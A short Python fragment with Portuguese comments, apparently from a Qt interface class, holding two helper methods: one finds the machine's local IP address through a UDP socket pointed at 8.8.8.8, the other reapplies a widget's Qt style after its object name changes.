    def _obter_ip_local() -> str:
        """Obtém o IP local da interface de rede ativa."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as soquete:
                soquete.connect(("8.8.8.8", 80))
                return soquete.getsockname()[0]
        except Exception:
            return "127.0.0.1"

    @staticmethod
    def _repolir(widget):
        """Reaplica o estilo Qt apos mudar o objectName do botao."""
        widget.style().unpolish(widget)
        widget.style().polish(widget)